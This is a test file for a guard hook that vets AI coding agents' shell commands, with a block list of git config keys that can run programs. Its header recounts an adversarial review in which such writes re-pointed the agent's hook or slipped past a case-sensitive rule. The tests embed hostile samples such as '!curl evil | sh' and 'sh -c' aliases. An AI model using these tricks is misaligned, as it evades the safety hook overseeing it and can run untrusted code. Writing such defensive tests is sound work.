/**
 * ADV-C3/ADV-H6 (2026-11-10 adversarial review): `git config core.worktree <dir>` re-pointed the Codex hook at an
 * attacker's script, `git config core.hookspath` slipped a case-sensitive rule, and `core.fsmonitor`, an alias,
 * `core.sshCommand`, `core.pager`, `credential.helper`, `diff.external`, `filter.*.smudge` and `include.path` all
 * make a later, allowed `git status` run a program outside the classifier. A write of any of them is denied in
 * every spelling; the everyday settings next to them stay allowed.
 */
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import {
  GIT_EXEC_CONFIG,
  gitConfigDenial,
  gitFileWrites,
  parseGitConfig,
} from "../harness/git-config-rules";
import { classifyBash } from "../harness/patterns";

const ROOT = join(__dirname, "../..");
const GUARD = join(ROOT, "scripts/harness/pre-tool-guard.ts");
const ctx = { root: "/repo", home: "/Users/dev", cwd: "/repo", exists: () => false };
const v = (cmd: string) => classifyBash(cmd, ctx);
const d = (cmd: string) => v(cmd).decision;

const EXEC_KEYS = [
  "core.worktree",
  "core.fsmonitor",
  "core.hooksPath",
  "core.sshCommand",
  "core.pager",
  "core.editor",
  "core.askPass",
  "core.gitProxy",
  "alias.x",
  "credential.helper",
  "credential.https://example.com.helper",
  "diff.external",
  "diff.word.textconv",
  "filter.lfs.smudge",
  "filter.lfs.clean",
  "filter.lfs.process",
  "include.path",
  "includeIf.gitdir:/x/.path",
  "merge.custom.driver",
  "mergetool.x.cmd",
  "difftool.x.path",
  "pager.log",
  "protocol.ext.allow",
  "gpg.program",
  "gpg.ssh.program",
  "sequence.editor",
  "uploadpack.packObjectsHook",
  "remote.origin.vcs",
  "remote.origin.uploadpack",
  "submodule.x.update",
  "trailer.sign.cmd",
  "interactive.diffFilter",
  "init.templateDir",
];
const EVERYDAY_KEYS = [
  "user.name",
  "user.email",
  "core.autocrlf",
  "core.quotepath",
  "color.ui",
  "pull.rebase",
  "push.default",
  "init.defaultBranch",
  "commit.gpgsign",
  "gpg.format",
  "diff.algorithm",
  "merge.ff",
  "branch.main.remote",
  "remote.origin.url",
  "rebase.autosquash",
  "alias",
];

describe("GIT_EXEC_CONFIG", () => {
  it.each(EXEC_KEYS)("names %s, in any case", (key) => {
    expect(GIT_EXEC_CONFIG.test(key)).toBe(true);
    expect(GIT_EXEC_CONFIG.test(key.toUpperCase())).toBe(true);
    expect(GIT_EXEC_CONFIG.test(key.toLowerCase())).toBe(true);
  });
  it.each(EVERYDAY_KEYS)("leaves %s alone", (key) => expect(GIT_EXEC_CONFIG.test(key)).toBe(false));
});

describe("parseGitConfig", () => {
  it.each([
    [["user.name", "x"], [{ key: "user.name", value: "x" }]],
    [["--global", "user.name", "x"], [{ key: "user.name", value: "x" }]],
    [["--add", "include.path", "x"], [{ key: "include.path", value: "x" }]],
    [["--replace-all", "k.v", "x"], [{ key: "k.v", value: "x" }]],
    [["set", "core.worktree", "/tmp"], [{ key: "core.worktree", value: "/tmp" }]],
    [["--file", "f", "k.v", "x"], [{ key: "k.v", value: "x" }]],
    [["-f", "f", "k.v", "x"], [{ key: "k.v", value: "x" }]],
    [["--file=f", "k.v", "x"], [{ key: "k.v", value: "x" }]],
    [["--type=bool", "k.v", "true"], [{ key: "k.v", value: "true" }]],
    [["--", "k.v", "x"], [{ key: "k.v", value: "x" }]],
  ])("reads %j as a write", (args, writes) => {
    expect(parseGitConfig(args).writes).toEqual(writes);
  });
  it.each([
    ["core.hooksPath"],
    ["--get", "core.hooksPath"],
    ["--get-all", "core.hooksPath"],
    ["--get-regexp", "core\\..*"],
    ["--list"],
    ["-l", "--show-origin"],
    ["--global", "--unset", "core.hooksPath"],
    ["get", "core.hooksPath"],
    ["unset", "core.hooksPath"],
    ["list"],
    ["--edit"],
    [],
  ])("reads %j as no write", (...args) => {
    expect(parseGitConfig(args as string[]).writes).toEqual([]);
  });
  it("collects the files a config write goes to", () => {
    expect(parseGitConfig(["--file", "a", "-f", "b", "--file=c", "-fd", "k", "v"]).files).toEqual([
      "a",
      "b",
      "c",
      "d",
    ]);
  });
});

describe("git config of an exec-capable key is denied, in every spelling", () => {
  it.each(EXEC_KEYS)("denies `git config %s <value>`", (key) => {
    expect(d(`git config ${key} x`), key).toBe("deny");
    expect(d(`git config --global ${key} x`), key).toBe("deny");
    expect(d(`git config --add ${key} x`), key).toBe("deny");
    expect(d(`git config --replace-all ${key} x`), key).toBe("deny");
    expect(d(`git config --file /tmp/c ${key} x`), key).toBe("deny");
    expect(d(`git config ${key.toUpperCase()} x`), key).toBe("deny");
  });
  it.each([
    "git config core.hookspath /dev/null",
    "git config CORE.HOOKSPATH /dev/null",
    "git config core.hooksPath ''",
    "git config core.fsmonitor 'sh -c x'",
    "git config alias.x '!sh -c id'",
    "git config --local core.worktree /tmp/evil",
    "git config --worktree core.worktree /tmp/evil",
    "git config set core.worktree /tmp/evil",
    "git -C apps config core.worktree /tmp/evil",
    "cd apps && git config core.sshCommand 'ssh -o ProxyCommand=x'",
    "git config --system include.path /tmp/evil",
  ])("denies %s", (cmd) => {
    const verdict = v(cmd);
    expect(verdict.decision, verdict.reason).toBe("deny");
    expect(verdict.reason).not.toMatch(/\/tmp\/evil|sh -c|ProxyCommand/);
  });
  it.each([
    "git -c core.fsmonitor=x status",
    "git -c diff.word.textconv=x diff",
    "git -c filter.a.smudge=x checkout",
    "git -c includeIf.gitdir:/x.path=/y status",
    "git -c core.worktree=/tmp/e status",
    "git -c init.templateDir=/tmp/t init",
  ])("denies the one-shot %s too (the same list)", (cmd) => expect(d(cmd)).toBe("deny"));
});

describe("git config of anything else, and every read, stays allowed", () => {
  it.each([
    "git config user.name 'Ada'",
    "git config --global user.email ada@example.com",
    "git config core.hooksPath .githooks",
    "git config --get core.hooksPath",
    "git config core.hookspath",
    "git config --list",
    "git config -l --show-origin",
    "git config --global --unset core.hooksPath",
    "git config --get-regexp 'alias\\..*'",
    "git config pull.rebase true",
    "git config core.autocrlf false",
    "git config --global init.defaultBranch main",
    "git config commit.gpgsign false",
    "git config get user.name",
    "git config remote.origin.url",
  ])("allows %s", (cmd) => {
    const verdict = v(cmd);
    expect(verdict.decision, verdict.reason).toBe("allow");
  });
});

describe("gitConfigDenial", () => {
  it("never echoes the value, and shortens a long key", () => {
    const reason = gitConfigDenial(["alias.x", "!curl evil | sh"]) ?? "";
    expect(reason).toContain("alias.x");
    expect(reason).not.toMatch(/curl|evil/);
    expect(gitConfigDenial([`alias.${"k".repeat(200)}`, "v"])?.length).toBeLessThan(600);
  });
  it("lets only the repo's own hooks path through", () => {
    expect(gitConfigDenial(["core.hooksPath", ".githooks"])).toBeNull();
    expect(gitConfigDenial(["core.hooksPath", "./.githooks"])).not.toBeNull();
    expect(gitConfigDenial(["core.hooksPath", "/dev/null"])).not.toBeNull();
  });
});

describe("git writes through an option are judged as writes to that file", () => {
  it("names the file", () => {
    expect(gitFileWrites("config", ["--file", "a", "k.v", "x"])).toEqual(["a"]);
    expect(gitFileWrites("archive", ["-o", "a.tar", "HEAD"])).toEqual(["a.tar"]);
    expect(gitFileWrites("archive", ["--output=a.tar", "HEAD"])).toEqual(["a.tar"]);
    expect(gitFileWrites("archive", ["-oa.tar", "HEAD"])).toEqual(["a.tar"]);
    expect(gitFileWrites("bundle", ["create", "-q", "a.bundle", "HEAD"])).toEqual(["a.bundle"]);
    expect(gitFileWrites("status", ["--short"])).toEqual([]);
  });
  it.each([
    "git config --file .git/config user.name x",
    "git config -f .git/config user.name x",
    "git config --file=.git/config user.name x",
    "git archive -o .git/hooks/x HEAD",
    "git archive --output=scripts/harness/x.tar HEAD",
    "git bundle create compliance/x.bundle HEAD",
  ])("asks before %s", (cmd) => expect(d(cmd)).toBe("ask"));
  it.each([
    "git config --file /tmp/c user.name x",
    "git archive -o /tmp/x.tar HEAD",
    "git archive --format=tar HEAD | tar -tf -",
    "git bundle create /tmp/x.bundle HEAD",
    "git config --file .gitconfig-local user.name x",
  ])("allows the everyday %s", (cmd) => {
    const verdict = v(cmd);
    expect(verdict.decision, verdict.reason).toBe("allow");
  });
});

describe("the real hook denies the Codex-redirecting config write in both agents", () => {
  const run = (args: string[]) =>
    spawnSync("bun", [GUARD, ...args], {
      input: JSON.stringify({
        hook_event_name: "PreToolUse",
        session_id: "git-config",
        tool_name: "Bash",
        tool_input: { command: "git config core.worktree /tmp/e" },
        cwd: ROOT,
      }),
      encoding: "utf8",
      env: { ...process.env, CW_AGENT_LEDGER: "off", CLAUDE_PROJECT_DIR: ROOT },
    });
  it.each([[[]], [["--codex"]]])("with args %j", (args) => {
    const r = run(args as string[]);
    expect(r.status, r.stderr).toBe(0);
    expect(JSON.parse(r.stdout).hookSpecificOutput.permissionDecision).toBe("deny");
  });
});
